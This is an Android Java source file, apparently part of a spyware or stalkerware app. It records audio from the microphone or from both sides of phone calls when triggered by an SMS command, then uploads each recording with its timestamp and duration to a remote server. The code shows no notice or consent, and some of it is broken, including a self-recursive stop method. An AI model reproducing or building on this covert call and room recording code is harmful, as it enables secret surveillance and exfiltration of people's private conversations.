package com.inet.android.audio;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.media.MediaRecorder;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Log;

import com.inet.android.request.ConstantValue;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;
import com.loopj.android.http.RequestParams;

/**
 * RecordAudio class is designed to record audio after command
 * smsBroadcastReceiver
 * 
 * @author johny homicide
 * 
 */
public final class RecordAudioV2 {

	private static MediaRecorder mMediaRecorder;
	private static String time;
	private static final String mPathName = "data";

	// Thread pool
	private static ExecutorService mThreadPool;
	public static AtomicBoolean mRecording = new AtomicBoolean(false);
	private static String outputFileName;
	private static String LOG_TAG = RecordAudioV2.class.getSimpleName()
			.toString();
	private final static int SECONDS_PER_MINUTE = 60;
	// private static final int MINUTE_PER_HOUR = 60;
	private static int minute = -1;
	private static int duration = -1;
	private static Context mContext;
	private static SharedPreferences sp;
	
	private final static Object lock = new Object();
	
	public static void start(final int minute, final int source, final Context ctx) {
		Log.d(LOG_TAG, "start");
		
		synchronized (lock) {
			mContext = ctx;
			if (mRecording.get()) {
				Log.d(LOG_TAG, "start mRecording = true");
			} else {
				Log.d(LOG_TAG, "start mRecording = false");
				stop();
			}
		}
	}
	
	public static void stop() {
		Log.d(LOG_TAG, "stop");
		
		synchronized (lock) {
			if (mRecording.get()) {
				Log.d(LOG_TAG, "stop mRecording = true");
			} else {
				Log.d(LOG_TAG, "stop mRecording = false");
			}
		}
	}

	/**
	 * Make audio recording.
	 * @param minute total time of the record
	 * @param source source of recording
	 * @param ctx
	 */
	public synchronized static void executeRecording(final int minute, final int source,
			final Context ctx) {
		mContext = ctx;

		if (mRecording.get()) {
			Log.d(LOG_TAG, "executeRecording mRecording = " + mRecording.get());
			
			RecordAudioV2.executeStopRecording(source, mContext);
		} else {
			Log.d(LOG_TAG, "executeRecording mRecording = " + mRecording.get());
		}

		mThreadPool = Executors.newCachedThreadPool();
		mThreadPool.execute(new Runnable() {

			@Override
			public void run() {
				outputFileName = getOutputFileName();
				if (outputFileName != null) {
					Logging.doLog(LOG_TAG, "executeRecording run", 
							"executeRecording run");
					
//					startRecording(minute, source, outputFileName);
					if (getRecorder(minute, source, outputFileName) != null) {
						Log.d(LOG_TAG, "executeRecording getRecord != null");
					} else {
						Log.d(LOG_TAG, "executeRecording getRecord == null");
						return;
					}
					
					// launch the counter
					Logging.doLog(LOG_TAG, "executeRecording mThreadPool.execute",
							"executeRecording mThreadPool.execute");
					Logging.doLog(LOG_TAG, "executeRecording minute = " + minute,
							"executeRecording minute = " + minute);
					mThreadPool.execute(new RecordingCounterUpdater());
				}
			}
		});
	}
	
	/**
	 * Make stopping audio recording.
	 */
	public synchronized static void executeStopRecording() {
//		if (mRecording.get()) {
//			Log.d(LOG_TAG, "executeStopRecording1 mRecording.get() = " + mRecording.get());
//		} else {
//			Log.d(LOG_TAG, "executeStopRecording1 mRecording.get() = " + mRecording.get() + ", return");
//			return;
//		}
		if (RecordAudioV2.mRecording.get()) {
			RecordAudioV2.executeStopRecording();
			
			int minuteAfterCall = ValueWork.getMethod(
					ConstantValue.RECORD_ENVORIMENT, mContext);
			
			Logging.doLog(LOG_TAG, "recording is true, minute after: " + minuteAfterCall,
					"recordAudio != null " + minuteAfterCall);
			
			if (minuteAfterCall == 0) {
				Logging.doLog(LOG_TAG, "minuteAfterCall == 0",
						"minuteAfterCall == 0");
				RecordAudioV2.checkStateRecord(mContext);
			} else {
				RecordAudioV2.executeRecording(minuteAfterCall, MediaRecorder.AudioSource.MIC, mContext);
			}
		}
		
		mThreadPool.execute(new Runnable() {
			@Override
			public void run() {
				if (mMediaRecorder != null) {
					Logging.doLog(LOG_TAG, "executeStopRecording ",	"executeStopRecording ");
					stopRecording();
					if (outputFileName != null) sendAudio(outputFileName);
					outputFileName = null;
				}

			}
		});
	}

	/**
	 * Make stopping audio recording.
	 * 
	 * @param source
	 * @param mContext
	 */
	public synchronized static void executeStopRecording(final int source,
			final Context mContext) {
		if (mRecording.get()) {
			Log.d(LOG_TAG, "executeStopRecording2 mRecording.get() = " + mRecording.get());
		} else {
			Log.d(LOG_TAG, "executeStopRecording2 mRecording.get() = " + mRecording.get() + " , return");
			return;
		}
		
		mThreadPool.execute(new Runnable() {
			@Override
			public void run() {
				if (mMediaRecorder != null) {
					sp = PreferenceManager
							.getDefaultSharedPreferences(mContext);
					Logging.doLog(LOG_TAG,
							"executeStopRecording source, mContext",
							"executeStopRecording source, mContext");

					Editor ed = sp.edit();
					Log.d(LOG_TAG, "duration = " + (minute - duration));
					ed.putInt("duration", minute - duration);
					ed.putInt("souce_record", source);
					ed.commit();

					stopRecording();
					if (outputFileName != null)
						sendAudio(outputFileName);
					outputFileName = null;
					executeRecording(-1, source, mContext);
				}
			}
		});
	}

	/**
	 * ][zwid
	 * 
	 * @param min
	 * @param source
	 * @param fileName
	 * @return
	 */
	private static MediaRecorder getRecorder(int min, int source,
			String fileName) {
		if (min != -1) {
			minute = min * SECONDS_PER_MINUTE;
		}		

//		if (mMediaRecorder == null) {
			Log.d(LOG_TAG, "mMediaRecorder = " + mMediaRecorder);
			Log.d(LOG_TAG, "source = " + source + ", minute = " + minute);

			mMediaRecorder = new MediaRecorder();
			
			Log.d(LOG_TAG, "mMediaRecorder = " + mMediaRecorder);
			
			switch (source) {
			case 1:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
				break;
			case 2:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_UPLINK);
				break;
			case 3:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK);
				break;
			case 4:
				Log.d(LOG_TAG, "source case 4");
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
				break;
			case 5:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
				break;
			case 6:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
				break;
			default:
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
				break;
			}

			mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
			mMediaRecorder.setOutputFile(fileName);
			mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
			mMediaRecorder.setAudioEncodingBitRate(16);
			mMediaRecorder.setAudioSamplingRate(44100);
			mMediaRecorder.setOnErrorListener(new RecorderErrorListener());
//		} else {
//			Log.d(LOG_TAG, "mMediaRecorder = " + mMediaRecorder);
//
//			mMediaRecorder.stop();
//			mMediaRecorder.reset();
//			mMediaRecorder.release();
//			mMediaRecorder = null;
//			return null;
//		}

		
		try {
			mMediaRecorder.prepare();
			mMediaRecorder.start();
			
			Logging.doLog(LOG_TAG, "mMediaRecorder.start()",
					"mMediaRecorder.start()");
		} catch (IllegalStateException e) {
			Logging.doLog(LOG_TAG,
					"IllegalStateException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder.stop();
			mMediaRecorder.reset();
			mMediaRecorder.release();
			mMediaRecorder = null;
		} catch (IOException e) {
			Logging.doLog(LOG_TAG,
					"IOException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder.stop();
			mMediaRecorder.reset();
			mMediaRecorder.release();
			mMediaRecorder = null;
		} catch (RuntimeException e) {
			e.printStackTrace();
			if (source != 6) {
				Log.d(LOG_TAG, "Runtimeexception. Switch to the source 6");
				getRecorder(minute, MediaRecorder.AudioSource.VOICE_RECOGNITION, fileName);
			} else {
				Log.d(LOG_TAG, "Runtimeexception. Source = 6. Return null. ");
				mRecording.set(false);
				return null;
			}
		}
		mRecording.set(true);
		Log.d(LOG_TAG, "mRecording = " + mRecording.get());
		return mMediaRecorder;
	}
	

	private static void stopRecording() {
		if (mMediaRecorder != null) {
			Logging.doLog(LOG_TAG, "Stopping recording", "Stopping recording");
			mMediaRecorder.stop();
//			mMediaRecorder.reset();
//			mMediaRecorder.release();
//			mMediaRecorder = null;
			mRecording.set(false);
			Log.d(LOG_TAG, "stopRecording mRecording = " + mRecording.get());
		}
	}

	// public void executeStopAfterCallRecordng() {
	// mThreadPool.execute(new RecordingCounterUpdater());
	// }

	public static void checkStateRecord(Context mContext) {
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		int appendRecord = sp.getInt("duration_record", -1);
		
		Log.d(LOG_TAG, "appendRecord: " + appendRecord);
		
		if (appendRecord != -1) {
			executeRecording(appendRecord, sp.getInt("source_record", -1),
					mContext);
			Editor ed = sp.edit();
			ed.putInt("duration", -1);
			ed.commit();
		}
	}

	/**
	 * Creates and gets output file name
	 * 
	 * @return
	 */
	private static String getOutputFileName() {
		// create media file
		String dir = Environment.getExternalStorageDirectory()
				.getAbsolutePath() + File.separator + mPathName;
		File filePath = new File(dir);
		if (!filePath.exists()) {
			filePath.mkdirs();
		}
		time = ConvertDate.logTime();
		String file = dir + "/" + time + ".aac";
		
		Logging.doLog(LOG_TAG, "file " + file, "file " + file);
		
		File audioFile = new File(file);
		try {
			if (!audioFile.exists()) {
				audioFile.createNewFile();
			}
		} catch (IOException e) {
			Logging.doLog(LOG_TAG, "Unable to create media file!",
					"Unable to create media file!");
			e.printStackTrace();
		}

		return audioFile.getAbsolutePath();
	}

	/**
	 * Updates duration counter while recording a message.
	 */
	private static class RecordingCounterUpdater implements Runnable {

		@Override
		public void run() {
			int currentCounter = 0;
			while (mRecording.get()) {
				if (minute != -1)
					postCounterUpdateMessage(currentCounter);
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					// Re-assert the thread's interrupted status
					Thread.currentThread().interrupt();
					return;
				}
				currentCounter++;
				duration = currentCounter;
				Logging.doLog(LOG_TAG, String.format(
						"posting counter update of:%d", currentCounter), String
						.format("posting counter update of:%d", currentCounter));
			}
		}
	}

	/**
	 * Posts current position in the voice file to the Handler.
	 */
	private static void postCounterUpdateMessage(int currentPosition) {

		if (currentPosition == minute) {
			Logging.doLog(LOG_TAG, "equals = " + minute, "equals = " + minute);
			executeStopRecording();
		}
	}

	private static void sendAudio(String path) {
		Logging.doLog(LOG_TAG, "sendAudio duration " + duration, "sendAudio "
				+ duration);
		if (!ValueWork.getLastCreateAudioFile().equals(path)) {
			RequestParams params = new RequestParams();
			try {
				params.put("data[][time]", ConvertDate.logTime());
				params.put("data[][type]", ConstantValue.TYPE_AUDIO_REQUEST);
				params.put("data[][duration]", duration);
				params.put("data[][path]", path);
				params.put("key", System.currentTimeMillis());
				params.put("data[][file]", new File(path));
			} catch (FileNotFoundException e) {
				Log.d(LOG_TAG, "FileNotFoundException");
				e.printStackTrace();
			}
			RequestList.sendFileRequest(params, mContext);
		}
	}

	/**
	 * Listener for the MediaRecorder error messages.
	 */
	private static class RecorderErrorListener implements
			android.media.MediaRecorder.OnErrorListener {

		@Override
		public void onError(MediaRecorder mp, int what, int extra) {

			String whatDescription = "";

			switch (what) {
			case MediaRecorder.MEDIA_RECORDER_ERROR_UNKNOWN:
				whatDescription = "MEDIA_RECORDER_ERROR_UNKNOWN";
				break;
			default:
				whatDescription = Integer.toString(what);
				break;
			}
			Logging.doLog(LOG_TAG, String.format(
					"MediaRecorder error occured: %s,%d", whatDescription,
					extra), String.format("MediaRecorder error occured: %s,%d",
					whatDescription, extra));
		}
	}

}